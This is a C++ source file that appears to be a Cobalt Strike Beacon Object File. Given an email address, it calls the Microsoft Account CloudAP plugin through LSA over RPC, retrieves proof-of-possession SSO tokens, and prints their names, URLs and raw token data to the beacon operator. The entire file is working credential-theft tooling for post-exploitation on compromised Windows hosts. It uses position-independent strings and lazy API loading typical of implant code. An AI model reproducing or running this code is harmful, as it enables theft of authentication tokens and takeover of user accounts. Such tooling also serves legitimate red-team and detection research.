// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"
#include "wlid_m.c"
#include <stdio.h>

GUID WLIDProviderGuid = { 0xD7F9888F, 0xE3FC, 0x49b0, 0x9E, 0xA6, 0xA8, 0x5B, 0x5F, 0x39, 0x2A, 0x4F };

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    BeaconData beaconData;
    BeaconDataParse(&beaconData, buffer, length);
    int dataLength{ 0 };
    auto email{ reinterpret_cast<wchar_t*>(BeaconDataExtract(&beaconData, &dataLength)) };
    char* inputBuffer{ nullptr };
    unsigned long inputBufferSize;
    handle_t encodingHandle;
    PIC_WSTRING(rpcrt4, L"RPCRT4.DLL");
    LAZY_LOAD_PROC(rpcrt4, MesEncodeDynBufferHandleCreate);
    if (LazyMesEncodeDynBufferHandleCreate(&inputBuffer, &inputBufferSize, &encodingHandle) == RPC_S_OK) {
        WlidPropertyBag wlidPropertyBag;
        Libc::memset(&wlidPropertyBag, '\0', sizeof(wlidPropertyBag));
        wlidPropertyBag.propertyCount = 3;
        auto propertyArraySize{ sizeof(WlidProperty) * wlidPropertyBag.propertyCount };
        wlidPropertyBag.pPropertyArray = reinterpret_cast<PWlidProperty>(Libc::malloc(propertyArraySize));
        auto pPropertyArray{ wlidPropertyBag.pPropertyArray };
        Libc::memset(reinterpret_cast<char*>(pPropertyArray), '\0', propertyArraySize);
        // The meaning of the 1st property is unknown but its value is verified
        // by MicrosoftAccountCloudAP!ValidateSerializedProtocolBuffer
        pPropertyArray[0].dataSize = sizeof(int);
        pPropertyArray[0].pData = reinterpret_cast<PBYTE>(Libc::malloc(pPropertyArray[0].dataSize));
        *reinterpret_cast<int*>(pPropertyArray[0].pData) = 2;
        // The 2nd property is used by MicrosoftAccountCloudAP!HandleGenericCallPkg
        // to set the value of "MicrosoftAccount:target=SSO_POP_User:user="
        pPropertyArray[1].dataSize = (Libc::wcslen(email) + 1) * sizeof(wchar_t);
        pPropertyArray[1].pData = reinterpret_cast<PUCHAR>(Libc::malloc(pPropertyArray[1].dataSize));
        Libc::memset(pPropertyArray[1].pData, '\0', pPropertyArray[1].dataSize);
        Libc::memcpy(pPropertyArray[1].pData, email, Libc::wcslen(email) * sizeof(wchar_t));
        auto marshelSize{ WlidPropertyBag_AlignSize(encodingHandle, &wlidPropertyBag) };
        inputBuffer = reinterpret_cast<char*>(Libc::malloc(marshelSize));
        Libc::memset(inputBuffer, '\0', marshelSize);
        LAZY_LOAD_PROC(rpcrt4, MesBufferHandleReset);
        LAZY_LOAD_PROC(rpcrt4, MesHandleFree);
        if (LazyMesBufferHandleReset(encodingHandle, MES_FIXED_BUFFER_HANDLE, MES_ENCODE, &inputBuffer, marshelSize, &inputBufferSize) == RPC_S_OK) {
            WlidPropertyBag_Encode(encodingHandle, &wlidPropertyBag);
            Libc::CHAR_SPAN submitBuffer;
            submitBuffer.data = inputBuffer;
            submitBuffer.count = inputBufferSize;
            Libc::CHAR_SPAN returnBuffer;
            if (LsaApi::CallCloudapPlugin(&WLIDProviderGuid, &submitBuffer, &returnBuffer)) {
                handle_t decodingHandle;
                LAZY_LOAD_PROC(rpcrt4, MesDecodeBufferHandleCreate);
                if (LazyMesDecodeBufferHandleCreate(returnBuffer.data, returnBuffer.count, &decodingHandle) == RPC_S_OK) {
                    ProofOfPossessionTokenBag popTokenBag = { 0 };
                    ProofOfPossessionTokenBag_Decode(decodingHandle, &popTokenBag);
                    for (size_t index{ 0 }; index < popTokenBag.tokenCount; index++) {
                        auto& popTokenData{ popTokenBag.pTokenArray[index] };
                        PIC_STRING(message01, "Pop token %d\n");
                        BeaconPrintf(CallbackType::OUTPUT, message01, index);
                        PIC_STRING(message02, "    Name     : %s\n");
                        BeaconPrintf(CallbackType::OUTPUT, message02, popTokenData.pName);
                        PIC_STRING(message03, "    Url      : %s\n");
                        BeaconPrintf(CallbackType::OUTPUT, message03, popTokenData.pUrl);
                        PIC_STRING(message04, "    P3pHeader: %s\n");
                        BeaconPrintf(CallbackType::OUTPUT, message04, popTokenData.pP3pHeader);
                        PIC_STRING(message05, "    TokenData: %s\n");
                        BeaconPrintf(CallbackType::OUTPUT, message05, popTokenData.pTokenData);
                        PIC_STRING(message06, "    Flags    : 0x%08X\n");
                        BeaconPrintf(CallbackType::OUTPUT, message06, popTokenData.flags);
                        if (popTokenData.tokenType == UserToken) {
                            PIC_STRING(message07, "    Type     : UserToken\n");
                            BeaconPrintf(CallbackType::OUTPUT, message07);
                        } else {
                            PIC_STRING(message07, "    Type     : DeviceToken\n");
                            BeaconPrintf(CallbackType::OUTPUT, message07);
                        }
                    }
                    ProofOfPossessionTokenBag_Free(decodingHandle, &popTokenBag);
                    LazyMesHandleFree(decodingHandle);
                }
                PIC_WSTRING(sspicli, L"SSPICLI.DLL");
                LAZY_LOAD_PROC(sspicli, LsaFreeReturnBuffer);
                LazyLsaFreeReturnBuffer(returnBuffer.data);
            } else {
                PIC_STRING(message, "Failed to get the pop token.\n");
                BeaconPrintf(CallbackType::ERROR, message);
            }
        } else {
            PIC_STRING(message, "Failed to reset the dynamic buffer handle for rpc.\n");
            BeaconPrintf(CallbackType::ERROR, message);
        }
        if (inputBuffer) {
            Libc::free(inputBuffer);
        }
        if (wlidPropertyBag.pPropertyArray) {
            if (wlidPropertyBag.pPropertyArray[0].pData) {
                Libc::free(wlidPropertyBag.pPropertyArray[0].pData);
            }
            if (wlidPropertyBag.pPropertyArray[1].pData) {
                Libc::free(wlidPropertyBag.pPropertyArray[1].pData);
            }
            Libc::free(wlidPropertyBag.pPropertyArray);
        }
        LazyMesHandleFree(encodingHandle);
    } else {
        PIC_STRING(message, "Failed to create a dynamic buffer handle for rpc.\n");
        BeaconPrintf(CallbackType::ERROR, message);
    }
}